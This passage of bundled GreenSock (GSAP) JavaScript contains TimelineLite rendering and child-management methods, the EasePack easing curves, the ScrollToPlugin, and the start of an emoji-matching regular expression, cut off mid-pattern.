            if ((_ !== f._time && (t += f._time - _), d - u <= t && 0 <= t))
              (f._totalTime = f._time = d),
                f._reversed ||
                  f._hasPausedChild() ||
                  ((n = !0),
                  (o = "onComplete"),
                  (a = !!f._timeline.autoRemoveChildren),
                  0 === f._duration &&
                    ((t <= 0 && -u <= t) ||
                      f._rawPrevTime < 0 ||
                      f._rawPrevTime === u) &&
                    f._rawPrevTime !== t &&
                    f._first &&
                    ((a = !0),
                    f._rawPrevTime > u && (o = "onReverseComplete"))),
                (f._rawPrevTime =
                  f._duration || !e || t || f._rawPrevTime === t ? t : u),
                (t = d + 1e-4);
            else if (t < u)
              if (
                ((f._totalTime = f._time = 0),
                -u < t && (t = 0),
                (0 !== _ ||
                  (0 === f._duration &&
                    f._rawPrevTime !== u &&
                    (0 < f._rawPrevTime || (t < 0 && 0 <= f._rawPrevTime)))) &&
                  ((o = "onReverseComplete"), (n = f._reversed)),
                t < 0)
              )
                (f._active = !1),
                  f._timeline.autoRemoveChildren && f._reversed
                    ? ((a = n = !0), (o = "onReverseComplete"))
                    : 0 <= f._rawPrevTime && f._first && (a = !0),
                  (f._rawPrevTime = t);
              else {
                if (
                  ((f._rawPrevTime =
                    f._duration || !e || t || f._rawPrevTime === t ? t : u),
                  0 === t && n)
                )
                  for (r = f._first; r && 0 === r._startTime; )
                    r._duration || (n = !1), (r = r._next);
                (t = 0), f._initted || (a = !0);
              }
            else {
              if (f._hasPause && !f._forcingPlayhead && !e) {
                if (_ <= t)
                  for (r = f._first; r && r._startTime <= t && !l; )
                    r._duration ||
                      "isPause" !== r.data ||
                      r.ratio ||
                      (0 === r._startTime && 0 === f._rawPrevTime) ||
                      (l = r),
                      (r = r._next);
                else
                  for (r = f._last; r && r._startTime >= t && !l; )
                    r._duration ||
                      ("isPause" === r.data && 0 < r._rawPrevTime && (l = r)),
                      (r = r._prev);
                l &&
                  ((f._time = f._totalTime = t = l._startTime),
                  (p = f._startTime + t / f._timeScale));
              }
              f._totalTime = f._time = f._rawPrevTime = t;
            }
            if ((f._time !== _ && f._first) || i || a || l) {
              if (
                (f._initted || (f._initted = !0),
                f._active ||
                  (!f._paused && f._time !== _ && 0 < t && (f._active = !0)),
                0 === _ &&
                  f.vars.onStart &&
                  ((0 === f._time && f._duration) ||
                    e ||
                    f._callback("onStart")),
                _ <= (h = f._time))
              )
                for (
                  r = f._first;
                  r && ((s = r._next), h === f._time && (!f._paused || y));

                )
                  (r._active || (r._startTime <= h && !r._paused && !r._gc)) &&
                    (l === r && (f.pause(), (f._pauseTime = p)),
                    r._reversed
                      ? r.render(
                          (r._dirty ? r.totalDuration() : r._totalDuration) -
                            (t - r._startTime) * r._timeScale,
                          e,
                          i
                        )
                      : r.render((t - r._startTime) * r._timeScale, e, i)),
                    (r = s);
              else
                for (
                  r = f._last;
                  r && ((s = r._prev), h === f._time && (!f._paused || y));

                ) {
                  if (
                    r._active ||
                    (r._startTime <= _ && !r._paused && !r._gc)
                  ) {
                    if (l === r) {
                      for (l = r._prev; l && l.endTime() > f._time; )
                        l.render(
                          l._reversed
                            ? l.totalDuration() -
                                (t - l._startTime) * l._timeScale
                            : (t - l._startTime) * l._timeScale,
                          e,
                          i
                        ),
                          (l = l._prev);
                      (l = null), f.pause(), (f._pauseTime = p);
                    }
                    r._reversed
                      ? r.render(
                          (r._dirty ? r.totalDuration() : r._totalDuration) -
                            (t - r._startTime) * r._timeScale,
                          e,
                          i
                        )
                      : r.render((t - r._startTime) * r._timeScale, e, i);
                  }
                  r = s;
                }
              f._onUpdate && (e || (c.length && D(), f._callback("onUpdate"))),
                o &&
                  (f._gc ||
                    (m !== f._startTime && g === f._timeScale) ||
                    !(0 === f._time || d >= f.totalDuration()) ||
                    (n &&
                      (c.length && D(),
                      f._timeline.autoRemoveChildren && f._enabled(!1, !1),
                      (f._active = !1)),
                    !e && f.vars[o] && f._callback(o)));
            }
          }),
          (m._hasPausedChild = function () {
            for (var t = this._first; t; ) {
              if (t._paused || (t instanceof r && t._hasPausedChild()))
                return !0;
              t = t._next;
            }
            return !1;
          }),
          (m.getChildren = function (t, e, r, n) {
            n = n || -9999999999;
            for (var s = [], o = this._first, a = 0; o; )
              o._startTime < n ||
                (o instanceof i
                  ? !1 !== e && (s[a++] = o)
                  : (!1 !== r && (s[a++] = o),
                    !1 !== t &&
                      (a = (s = s.concat(o.getChildren(!0, e, r))).length))),
                (o = o._next);
            return s;
          }),
          (m.getTweensOf = function (t, e) {
            var r,
              n,
              s = this._gc,
              o = [],
              a = 0;
            for (
              s && this._enabled(!0, !0), n = (r = i.getTweensOf(t)).length;
              -1 < --n;

            )
              (r[n].timeline === this || (e && this._contains(r[n]))) &&
                (o[a++] = r[n]);
            return s && this._enabled(!1, !0), o;
          }),
          (m.recent = function () {
            return this._recent;
          }),
          (m._contains = function (t) {
            for (var e = t.timeline; e; ) {
              if (e === this) return !0;
              e = e.timeline;
            }
            return !1;
          }),
          (m.shiftChildren = function (t, e, i) {
            i = i || 0;
            for (var r, n = this._first, s = this._labels; n; )
              n._startTime >= i && (n._startTime += t), (n = n._next);
            if (e) for (r in s) s[r] >= i && (s[r] += t);
            return this._uncache(!0);
          }),
          (m._kill = function (t, e) {
            if (!t && !e) return this._enabled(!1, !1);
            for (
              var i = e ? this.getTweensOf(e) : this.getChildren(!0, !0, !1),
                r = i.length,
                n = !1;
              -1 < --r;

            )
              i[r]._kill(t, e) && (n = !0);
            return n;
          }),
          (m.clear = function (t) {
            var e = this.getChildren(!1, !0, !0),
              i = e.length;
            for (this._time = this._totalTime = 0; -1 < --i; )
              e[i]._enabled(!1, !1);
            return !1 !== t && (this._labels = {}), this._uncache(!0);
          }),
          (m.invalidate = function () {
            for (var e = this._first; e; ) e.invalidate(), (e = e._next);
            return t.prototype.invalidate.call(this);
          }),
          (m._enabled = function (t, i) {
            if (t === this._gc)
              for (var r = this._first; r; ) r._enabled(t, !0), (r = r._next);
            return e.prototype._enabled.call(this, t, i);
          }),
          (m.totalTime = function (e, i, r) {
            this._forcingPlayhead = !0;
            var n = t.prototype.totalTime.apply(this, arguments);
            return (this._forcingPlayhead = !1), n;
          }),
          (m.duration = function (t) {
            return arguments.length
              ? (0 !== this.duration() &&
                  0 !== t &&
                  this.timeScale(this._duration / t),
                this)
              : (this._dirty && this.totalDuration(), this._duration);
          }),
          (m.totalDuration = function (t) {
            if (arguments.length)
              return t && this.totalDuration()
                ? this.timeScale(this._totalDuration / t)
                : this;
            if (this._dirty) {
              for (
                var e, i, r = 0, n = this, s = n._last, o = 999999999999;
                s;

              )
                (e = s._prev),
                  s._dirty && s.totalDuration(),
                  s._startTime > o &&
                  n._sortChildren &&
                  !s._paused &&
                  !n._calculatingDuration
                    ? ((n._calculatingDuration = 1),
                      n.add(s, s._startTime - s._delay),
                      (n._calculatingDuration = 0))
                    : (o = s._startTime),
                  s._startTime < 0 &&
                    !s._paused &&
                    ((r -= s._startTime),
                    n._timeline.smoothChildTiming &&
                      ((n._startTime += s._startTime / n._timeScale),
                      (n._time -= s._startTime),
                      (n._totalTime -= s._startTime),
                      (n._rawPrevTime -= s._startTime)),
                    n.shiftChildren(-s._startTime, !1, -9999999999),
                    (o = 0)),
                  r < (i = s._startTime + s._totalDuration / s._timeScale) &&
                    (r = i),
                  (s = e);
              (n._duration = n._totalDuration = r), (n._dirty = !1);
            }
            return this._totalDuration;
          }),
          (m.paused = function (e) {
            if (!1 === e && this._paused)
              for (var i = this._first; i; )
                i._startTime === this._time &&
                  "isPause" === i.data &&
                  (i._rawPrevTime = 0),
                  (i = i._next);
            return t.prototype.paused.apply(this, arguments);
          }),
          (m.usesFrames = function () {
            for (var e = this._timeline; e._timeline; ) e = e._timeline;
            return e === t._rootFramesTimeline;
          }),
          (m.rawTime = function (t) {
            return t &&
              (this._paused ||
                (this._repeat && 0 < this.time() && this.totalProgress() < 1))
              ? this._totalTime % (this._duration + this._repeatDelay)
              : this._paused
              ? this._totalTime
              : (this._timeline.rawTime(t) - this._startTime) * this._timeScale;
          }),
          r
        );
      },
      !0
    );
  }),
  _gsScope._gsDefine && _gsScope._gsQueue.pop()(),
  (function () {
    "use strict";
    function t() {
      return (_gsScope.GreenSockGlobals || _gsScope).TimelineLite;
    }
    "undefined" != typeof module && module.exports
      ? (require("./TweenLite.min.js"), (module.exports = t()))
      : "function" == typeof define && define.amd && define(["TweenLite"], t);
  })(),
  (
    (_gsScope =
      "undefined" != typeof module &&
      module.exports &&
      "undefined" != typeof global
        ? global
        : this || window)._gsQueue || (_gsScope._gsQueue = [])
  ).push(function () {
    "use strict";
    _gsScope._gsDefine(
      "easing.Back",
      ["easing.Ease"],
      function (t) {
        function e(e, i) {
          var r = c("easing." + e, function () {}, !0),
            n = (r.prototype = new t());
          return (n.constructor = r), (n.getRatio = i), r;
        }
        function i(t, e, i, r, n) {
          var s = c(
            "easing." + t,
            { easeOut: new e(), easeIn: new i(), easeInOut: new r() },
            !0
          );
          return D(s, t), s;
        }
        function r(t, e, i) {
          (this.t = t),
            (this.v = e),
            i &&
              ((((this.next = i).prev = this).c = i.v - e),
              (this.gap = i.t - t));
        }
        function n(e, i) {
          var r = c(
              "easing." + e,
              function (t) {
                (this._p1 = t || 0 === t ? t : 1.70158),
                  (this._p2 = 1.525 * this._p1);
              },
              !0
            ),
            n = (r.prototype = new t());
          return (
            (n.constructor = r),
            (n.getRatio = i),
            (n.config = function (t) {
              return new r(t);
            }),
            r
          );
        }
        var s,
          o,
          a,
          u,
          l = _gsScope.GreenSockGlobals || _gsScope,
          h = l.com.greensock,
          p = 2 * Math.PI,
          f = Math.PI / 2,
          c = h._class,
          D = t.register || function () {},
          _ = i(
            "Back",
            n("BackOut", function (t) {
              return (t -= 1) * t * ((this._p1 + 1) * t + this._p1) + 1;
            }),
            n("BackIn", function (t) {
              return t * t * ((this._p1 + 1) * t - this._p1);
            }),
            n("BackInOut", function (t) {
              return (t *= 2) < 1
                ? 0.5 * t * t * ((this._p2 + 1) * t - this._p2)
                : 0.5 * ((t -= 2) * t * ((this._p2 + 1) * t + this._p2) + 2);
            })
          ),
          d = c(
            "easing.SlowMo",
            function (t, e, i) {
              (e = e || 0 === e ? e : 0.7),
                null == t ? (t = 0.7) : 1 < t && (t = 1),
                (this._p = 1 !== t ? e : 0),
                (this._p1 = (1 - t) / 2),
                (this._p2 = t),
                (this._p3 = this._p1 + this._p2),
                (this._calcEnd = !0 === i);
            },
            !0
          ),
          m = (d.prototype = new t());
        return (
          (m.constructor = d),
          (m.getRatio = function (t) {
            var e = t + (0.5 - t) * this._p;
            return t < this._p1
              ? this._calcEnd
                ? 1 - (t = 1 - t / this._p1) * t
                : e - (t = 1 - t / this._p1) * t * t * t * e
              : t > this._p3
              ? this._calcEnd
                ? 1 === t
                  ? 0
                  : 1 - (t = (t - this._p3) / this._p1) * t
                : e + (t - e) * (t = (t - this._p3) / this._p1) * t * t * t
              : this._calcEnd
              ? 1
              : e;
          }),
          (d.ease = new d(0.7, 0.7)),
          (m.config = d.config =
            function (t, e, i) {
              return new d(t, e, i);
            }),
          ((m = (s = c(
            "easing.SteppedEase",
            function (t, e) {
              (t = t || 1),
                (this._p1 = 1 / t),
                (this._p2 = t + (e ? 0 : 1)),
                (this._p3 = e ? 1 : 0);
            },
            !0
          )).prototype =
            new t()).constructor = s),
          (m.getRatio = function (t) {
            return (
              t < 0 ? (t = 0) : 1 <= t && (t = 0.999999999),
              (((this._p2 * t) | 0) + this._p3) * this._p1
            );
          }),
          (m.config = s.config =
            function (t, e) {
              return new s(t, e);
            }),
          ((m = (o = c(
            "easing.ExpoScaleEase",
            function (t, e, i) {
              (this._p1 = Math.log(e / t)),
                (this._p2 = e - t),
                (this._p3 = t),
                (this._ease = i);
            },
            !0
          )).prototype =
            new t()).constructor = o),
          (m.getRatio = function (t) {
            return (
              this._ease && (t = this._ease.getRatio(t)),
              (this._p3 * Math.exp(this._p1 * t) - this._p3) / this._p2
            );
          }),
          (m.config = o.config =
            function (t, e, i) {
              return new o(t, e, i);
            }),
          ((m = (a = c(
            "easing.RoughEase",
            function (e) {
              for (
                var i,
                  n,
                  s,
                  o,
                  a,
                  u,
                  l = (e = e || {}).taper || "none",
                  h = [],
                  p = 0,
                  f = 0 | (e.points || 20),
                  c = f,
                  D = !1 !== e.randomize,
                  _ = !0 === e.clamp,
                  d = e.template instanceof t ? e.template : null,
                  m = "number" == typeof e.strength ? 0.4 * e.strength : 0.4;
                -1 < --c;

              )
                (i = D ? Math.random() : (1 / f) * c),
                  (n = d ? d.getRatio(i) : i),
                  (s =
                    "none" === l
                      ? m
                      : "out" === l
                      ? (o = 1 - i) * o * m
                      : "in" === l
                      ? i * i * m
                      : (o = i < 0.5 ? 2 * i : 2 * (1 - i)) * o * 0.5 * m),
                  D
                    ? (n += Math.random() * s - 0.5 * s)
                    : c % 2
                    ? (n += 0.5 * s)
                    : (n -= 0.5 * s),
                  _ && (1 < n ? (n = 1) : n < 0 && (n = 0)),
                  (h[p++] = { x: i, y: n });
              for (
                h.sort(function (t, e) {
                  return t.x - e.x;
                }),
                  u = new r(1, 1, null),
                  c = f;
                -1 < --c;

              )
                u = new r((a = h[c]).x, a.y, u);
              this._prev = new r(0, 0, 0 !== u.t ? u : u.next);
            },
            !0
          )).prototype =
            new t()).constructor = a),
          (m.getRatio = function (t) {
            var e = this._prev;
            if (t > e.t) {
              for (; e.next && t >= e.t; ) e = e.next;
              e = e.prev;
            } else for (; e.prev && t <= e.t; ) e = e.prev;
            return (this._prev = e).v + ((t - e.t) / e.gap) * e.c;
          }),
          (m.config = function (t) {
            return new a(t);
          }),
          (a.ease = new a()),
          i(
            "Bounce",
            e("BounceOut", function (t) {
              return t < 1 / 2.75
                ? 7.5625 * t * t
                : t < 2 / 2.75
                ? 7.5625 * (t -= 1.5 / 2.75) * t + 0.75
                : t < 2.5 / 2.75
                ? 7.5625 * (t -= 2.25 / 2.75) * t + 0.9375
                : 7.5625 * (t -= 2.625 / 2.75) * t + 0.984375;
            }),
            e("BounceIn", function (t) {
              return (t = 1 - t) < 1 / 2.75
                ? 1 - 7.5625 * t * t
                : t < 2 / 2.75
                ? 1 - (7.5625 * (t -= 1.5 / 2.75) * t + 0.75)
                : t < 2.5 / 2.75
                ? 1 - (7.5625 * (t -= 2.25 / 2.75) * t + 0.9375)
                : 1 - (7.5625 * (t -= 2.625 / 2.75) * t + 0.984375);
            }),
            e("BounceInOut", function (t) {
              var e = t < 0.5;
              return (
                (t =
                  (t = e ? 1 - 2 * t : 2 * t - 1) < 1 / 2.75
                    ? 7.5625 * t * t
                    : t < 2 / 2.75
                    ? 7.5625 * (t -= 1.5 / 2.75) * t + 0.75
                    : t < 2.5 / 2.75
                    ? 7.5625 * (t -= 2.25 / 2.75) * t + 0.9375
                    : 7.5625 * (t -= 2.625 / 2.75) * t + 0.984375),
                e ? 0.5 * (1 - t) : 0.5 * t + 0.5
              );
            })
          ),
          i(
            "Circ",
            e("CircOut", function (t) {
              return Math.sqrt(1 - (t -= 1) * t);
            }),
            e("CircIn", function (t) {
              return -(Math.sqrt(1 - t * t) - 1);
            }),
            e("CircInOut", function (t) {
              return (t *= 2) < 1
                ? -0.5 * (Math.sqrt(1 - t * t) - 1)
                : 0.5 * (Math.sqrt(1 - (t -= 2) * t) + 1);
            })
          ),
          i(
            "Elastic",
            (u = function (e, i, r) {
              var n = c(
                  "easing." + e,
                  function (t, e) {
                    (this._p1 = 1 <= t ? t : 1),
                      (this._p2 = (e || r) / (t < 1 ? t : 1)),
                      (this._p3 =
                        (this._p2 / p) * (Math.asin(1 / this._p1) || 0)),
                      (this._p2 = p / this._p2);
                  },
                  !0
                ),
                s = (n.prototype = new t());
              return (
                (s.constructor = n),
                (s.getRatio = i),
                (s.config = function (t, e) {
                  return new n(t, e);
                }),
                n
              );
            })(
              "ElasticOut",
              function (t) {
                return (
                  this._p1 *
                    Math.pow(2, -10 * t) *
                    Math.sin((t - this._p3) * this._p2) +
                  1
                );
              },
              0.3
            ),
            u(
              "ElasticIn",
              function (t) {
                return (
                  -this._p1 *
                  Math.pow(2, 10 * (t -= 1)) *
                  Math.sin((t - this._p3) * this._p2)
                );
              },
              0.3
            ),
            u(
              "ElasticInOut",
              function (t) {
                return (t *= 2) < 1
                  ? this._p1 *
                      Math.pow(2, 10 * (t -= 1)) *
                      Math.sin((t - this._p3) * this._p2) *
                      -0.5
                  : this._p1 *
                      Math.pow(2, -10 * (t -= 1)) *
                      Math.sin((t - this._p3) * this._p2) *
                      0.5 +
                      1;
              },
              0.45
            )
          ),
          i(
            "Expo",
            e("ExpoOut", function (t) {
              return 1 - Math.pow(2, -10 * t);
            }),
            e("ExpoIn", function (t) {
              return Math.pow(2, 10 * (t - 1)) - 0.001;
            }),
            e("ExpoInOut", function (t) {
              return (t *= 2) < 1
                ? 0.5 * Math.pow(2, 10 * (t - 1))
                : 0.5 * (2 - Math.pow(2, -10 * (t - 1)));
            })
          ),
          i(
            "Sine",
            e("SineOut", function (t) {
              return Math.sin(t * f);
            }),
            e("SineIn", function (t) {
              return 1 - Math.cos(t * f);
            }),
            e("SineInOut", function (t) {
              return -0.5 * (Math.cos(Math.PI * t) - 1);
            })
          ),
          c(
            "easing.EaseLookup",
            {
              find: function (e) {
                return t.map[e];
              },
            },
            !0
          ),
          D(l.SlowMo, "SlowMo", "ease,"),
          D(a, "RoughEase", "ease,"),
          D(s, "SteppedEase", "ease,"),
          _
        );
      },
      !0
    );
  }),
  _gsScope._gsDefine && _gsScope._gsQueue.pop()(),
  (function () {
    "use strict";
    function t() {
      return _gsScope.GreenSockGlobals || _gsScope;
    }
    "undefined" != typeof module && module.exports
      ? (require("../TweenLite.min.js"), (module.exports = t()))
      : "function" == typeof define && define.amd && define(["TweenLite"], t);
  })(),
  (
    (_gsScope =
      "undefined" != typeof module &&
      module.exports &&
      "undefined" != typeof global
        ? global
        : this || window)._gsQueue || (_gsScope._gsQueue = [])
  ).push(function () {
    "use strict";
    function t(t, e) {
      var i = "x" === e ? "Width" : "Height",
        r = "scroll" + i,
        o = "client" + i,
        a = document.body;
      return t === s || t === n || t === a
        ? Math.max(n[r], a[r]) - (s["inner" + i] || n[o] || a[o])
        : t[r] - t["offset" + i];
    }
    function e(t, e) {
      var i = "scroll" + ("x" === e ? "Left" : "Top");
      return (
        t === s &&
          (null != t.pageXOffset
            ? (i = "page" + e.toUpperCase() + "Offset")
            : (t = null != n[i] ? n : document.body)),
        function () {
          return t[i];
        }
      );
    }
    function i(t, i) {
      var r = (function (t) {
          return (
            "string" == typeof t && (t = TweenLite.selector(t)),
            t.length &&
              t !== s &&
              t[0] &&
              t[0].style &&
              !t.nodeType &&
              (t = t[0]),
            t === s || (t.nodeType && t.style) ? t : null
          );
        })(t).getBoundingClientRect(),
        o = document.body,
        a = !i || i === s || i === o,
        u = a
          ? {
              top:
                n.clientTop -
                (window.pageYOffset || n.scrollTop || o.scrollTop || 0),
              left:
                n.clientLeft -
                (window.pageXOffset || n.scrollLeft || o.scrollLeft || 0),
            }
          : i.getBoundingClientRect(),
        l = { x: r.left - u.left, y: r.top - u.top };
      return !a && i && ((l.x += e(i, "x")()), (l.y += e(i, "y")())), l;
    }
    function r(e, r, n, s) {
      var o = typeof e;
      return isNaN(e)
        ? "string" == o && "=" === e.charAt(1)
          ? parseInt(e.charAt(0) + "1", 10) * parseFloat(e.substr(2)) + s
          : "max" === e
          ? t(r, n)
          : Math.min(t(r, n), i(e, r)[n])
        : parseFloat(e);
    }
    var n = (_gsScope.document || {}).documentElement,
      s = _gsScope,
      o = _gsScope._gsDefine.plugin({
        propName: "scrollTo",
        API: 2,
        global: !0,
        version: "1.9.2",
        init: function (t, i, n) {
          return (
            (this._wdw = t === s),
            (this._target = t),
            (this._tween = n),
            "object" != typeof i
              ? "string" == typeof (i = { y: i }).y &&
                "max" !== i.y &&
                "=" !== i.y.charAt(1) &&
                (i.x = i.y)
              : i.nodeType && (i = { y: i, x: i }),
            (this.vars = i),
            (this._autoKill = !1 !== i.autoKill),
            (this.getX = e(t, "x")),
            (this.getY = e(t, "y")),
            (this.x = this.xPrev = this.getX()),
            (this.y = this.yPrev = this.getY()),
            null != i.x
              ? (this._addTween(
                  this,
                  "x",
                  this.x,
                  r(i.x, t, "x", this.x) - (i.offsetX || 0),
                  "scrollTo_x",
                  !0
                ),
                this._overwriteProps.push("scrollTo_x"))
              : (this.skipX = !0),
            null != i.y
              ? (this._addTween(
                  this,
                  "y",
                  this.y,
                  r(i.y, t, "y", this.y) - (i.offsetY || 0),
                  "scrollTo_y",
                  !0
                ),
                this._overwriteProps.push("scrollTo_y"))
              : (this.skipY = !0),
            !0
          );
        },
        set: function (e) {
          this._super.setRatio.call(this, e);
          var i = this._wdw || !this.skipX ? this.getX() : this.xPrev,
            r = this._wdw || !this.skipY ? this.getY() : this.yPrev,
            n = r - this.yPrev,
            a = i - this.xPrev,
            u = o.autoKillThreshold;
          this.x < 0 && (this.x = 0),
            this.y < 0 && (this.y = 0),
            this._autoKill &&
              (!this.skipX &&
                (u < a || a < -u) &&
                i < t(this._target, "x") &&
                (this.skipX = !0),
              !this.skipY &&
                (u < n || n < -u) &&
                r < t(this._target, "y") &&
                (this.skipY = !0),
              this.skipX &&
                this.skipY &&
                (this._tween.kill(),
                this.vars.onAutoKill &&
                  this.vars.onAutoKill.apply(
                    this.vars.onAutoKillScope || this._tween,
                    this.vars.onAutoKillParams || []
                  ))),
            this._wdw
              ? s.scrollTo(this.skipX ? i : this.x, this.skipY ? r : this.y)
              : (this.skipY || (this._target.scrollTop = this.y),
                this.skipX || (this._target.scrollLeft = this.x)),
            (this.xPrev = this.x),
            (this.yPrev = this.y);
        },
      }),
      a = o.prototype;
    (o.max = t),
      (o.getOffset = i),
      (o.buildGetter = e),
      (o.autoKillThreshold = 7),
      (a._kill = function (t) {
        return (
          t.scrollTo_x && (this.skipX = !0),
          t.scrollTo_y && (this.skipY = !0),
          this._super._kill.call(this, t)
        );
      });
  }),
  _gsScope._gsDefine && _gsScope._gsQueue.pop()(),
  (function () {
    "use strict";
    function t() {
      return (_gsScope.GreenSockGlobals || _gsScope).ScrollToPlugin;
    }
    "undefined" != typeof module && module.exports
      ? (require("../TweenLite.min.js"), (module.exports = t()))
      : "function" == typeof define && define.amd && define(["TweenLite"], t);
  })(),
  (function (t, e) {
    "object" == typeof exports && "undefined" != typeof module
      ? e(exports)
      : "function" == typeof define && define.amd
      ? define(["exports"], e)
      : e(((t = t || self).window = t.window || {}));
  })(this, function (t) {
    "use strict";
    var e =
      /([\uD800-\uDBFF][\uDC00-\uDFFF](?:[\u200D\uFE0F][\uD800-\uDBFF][\uDC00-\uDFFF]){2,}|\uD83D\uDC69(?:\u200D(?:(?:\uD83D\uDC69\u200D)?\uD83D\uDC67|(?:\uD83D\uDC69\u200D)?\uD83D\uDC66)|\uD83C[\uDFFB-\uDFFF])|\uD83D\uDC69\u200D(?:\uD83D\uDC69\u200D)?\uD83D\uDC66\u200D\uD83D\uDC66|\uD83D\uDC69\u200D(?:\uD83D\uDC69\u200D)?\uD83D\uDC67\u200D(?:\uD83D[\uDC66\uDC67])|\uD83C\uDFF3\uFE0F\u200D\uD83C\uDF08|(?:\uD83C[\uDFC3\uDFC4\uDFCA]|\uD83D[\uDC6E\uDC71\uDC73\uDC77\uDC81\uDC82\uDC86\uDC87\uDE45-\uDE47\uDE4B\uDE4D\uDE4E\uDEA3\uDEB4-\uDEB6]|\uD83E[\uDD26\uDD37-\uDD39\uDD3D\uDD3E\uDDD6-\uDDDD])(?:\uD83C[\uDFFB-\uDFFF])\u200D[\u2640\u2642]\uFE0F|\uD83D\uDC69(?:\uD83C[\uDFFB-\uDFFF])\u200D(?:\uD83C[\uDF3E\uDF73\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92])|(?:\uD83C[\uDFC3\uDFC4\uDFCA]|\uD83D[\uDC6E\uDC6F\uDC71\uDC73\uDC77\uDC81\uDC82\uDC86\uDC87\uDE45-\uDE47\uDE4B\uDE4D\uDE4E\uDEA3\uDEB4-\uDEB6]|\uD83E[\uDD26\uDD37-\uDD39\uDD3C-\uDD3E\uDDD6-\uDDDF])\u200D[\u2640\u2642]\uFE0F|\uD83C\uDDFD\uD83C\uDDF0|\uD83C\uDDF6\uD83C\uDDE6|\uD83C\uDDF4\uD83C\uDDF2|\uD83C\uDDE9(?:\uD83C[\uDDEA\uDDEC\uDDEF\uDDF0\uDDF2\uDDF4\uDDFF])|\uD83C\uDDF7(?:\uD83C[\uDDEA\uDDF4\uDDF8\uDDFA\uDDFC])|\uD83C\uDDE8(?:\uD83C[\uDDE6\uDDE8\uDDE9\uDDEB-\uDDEE\uDDF0-\uDDF5\uDDF7\uDDFA-\uDDFF])|(?:\u26F9|\uD83C[\uDFCB\uDFCC]|\uD83D\uDD75)(?:\uFE0F\u200D[\u2640\u2642]|(?:\uD83C[\uDFFB-\uDFFF])\u200D[\u2640\u2642])\uFE0F|(?:\uD83D\uDC41\uFE0F\u200D\uD83D\uDDE8|\uD83D\uDC69(?:\uD83C[\uDFFB-\uDFFF])\u200D[\u2695\u2696\u2708]|\uD83D\uDC69\u200D[\u2695\u2696\u2708]|\uD83D\uDC68(?:(?:\uD83C[\uDFFB-\uDFFF])\u200D[\u2695\u2696\u2708]|\u200D[\u2695\u2696\u2708]))\uFE0F|\uD83C\uDDF2(?:\uD83C[\uDDE6\uDDE8-\uDDED\uDDF0-\uDDFF])|\uD83D\uDC69\u200D(?:\uD83C[\uDF3E\uDF73\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D(?:\uD83D[\uDC68\uDC69])|\uD83D[\uDC68\uDC69]))|\uD83C\uDDF1(?:\uD83C[\uDDE6-\uDDE8\uDDEE\uDDF0\uDDF7-\uDDFB\uDDFE])|\uD83C\uDDEF(?:\uD83C[\uDDEA\uDDF2\uDDF4\uDDF5])|\uD83C\uDDED(?:\uD83C[\uDDF0\uDDF2\uDDF3\uDDF7\uDDF9\uDDFA])|\uD83C\uDDEB(?:\uD83C[\uDDEE-\uDDF0\uDDF2\uDDF4\uDDF7])|[#\*0-9]\uFE0F\u20E3|\uD83C\uDDE7(?:\uD83C[\uDDE6\uDDE7\uDDE9-\uDDEF\uDDF1-\uDDF4\uDDF6-\uDDF9\uDDFB\uDDFC\uDDFE\uDDFF])|\uD83C\uDDE6(?:\uD83C[\uDDE8-\uDDEC\uDDEE\uDDF1\uDDF2\uDDF4\uDDF6-\uDDFA\uDDFC\uDDFD\uDDFF])|\uD83C\uDDFF(?:\uD83C[\uDDE6\uDDF2\uDDFC])|\uD83C\uDDF5(?:\uD83C[\uDDE6\uDDEA-\uDDED\uDDF0-\uDDF3\uDDF7-\uDDF9\uDDFC\uDDFE])|\uD83C\uDDFB(?:\uD83C[\uDDE6\uDDE8\uDDEA\uDDEC\uDDEE\uDDF3\uDDFA])|\uD83C\uDDF3(?:\uD83C[\uDDE6\uDDE8\uDDEA-\uDDEC\uDDEE\uDDF1\uDDF4\uDDF5\uDDF7\uDDFA\uDDFF])|\uD83C\uDFF4\uDB40\uDC67\uDB40\uDC62(?:\uDB40\uDC77\uDB40\uDC6C\uDB40\uDC73|\uDB40\uDC73\uDB40\uDC63\uDB40\uDC74|\uDB40\uDC65\uDB40\uDC6E\uDB40\uDC67)\uDB40\uDC7F|\uD83D\uDC68(?:\u200D(?:\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D)?\uD83D\uDC68|(?:(?:\uD83D[\uDC68\uDC69])\u200D)?\uD83D\uDC66\u200D\uD83D\uDC66|(?:(?:\uD83D[\uDC68\uDC69])\u200D)?\uD83D\uDC67\u200D(?:\uD83D[\uDC66\uDC67])|\uD83C[\uDF3E\uDF73\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92])|(?:\uD83C[\uDFFB-\uDFFF])\u200D(?:\uD83C[\uDF3E\uDF73\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]))|\uD83C\uDDF8(?:\uD83C[\uDDE6-\uDDEA\uDDEC-\uDDF4\uDDF7-\uDDF9\uDDFB\uDDFD-\uDDFF])|\uD83C\uDDF0(?:\uD83C[\uDDEA\uDDEC-\uDDEE\uDDF2\uDDF3\uDDF5\uDDF7\uDDFC\uDDFE\uDDFF])|\uD83C\uDDFE(?:\uD83C[\uDDEA\uDDF9])|\uD83C\uDDEE(?:\uD83C[\uDDE8-\uDDEA\uDDF1-\uDDF4\uDDF6-\uDDF9])|\uD83C\uDDF9(?:\uD83C[\uDDE6\uDDE8\uDDE9\uDDEB-\uDDED\uDDEF-\uDDF4\uDDF7\uDDF9\uDDFB\uDDFC\uDDFF])|\uD83C\uDDEC(?:\uD83C[\uDDE6\uDDE7\uDDE9-\uDDEE\uDDF1-\uDDF3\uDDF5-\uDDFA\uDDFC\uDDFE])|\uD83C\uDDFA(?:\uD83C[\uDDE6\uDDEC\uDDF2\uDDF3\uDDF8\uDDFE\uDDFF])|\uD83C\uDDEA(?:\uD83C[\uDDE6\uDDE8\uDDEA\uDDEC\uDDED\uDDF7-\uDDFA])|\uD83C\uDDFC(?:\uD83C[\uDDEB\uDDF8])|(?:\u26F9|\uD83C[\uDFCB\uDFCC]|\uD83D\uDD75)(?:\uD83C[\uDFFB-\uDFFF])|(?:\uD83C[\uDFC3\uDFC4\uDFCA]|\uD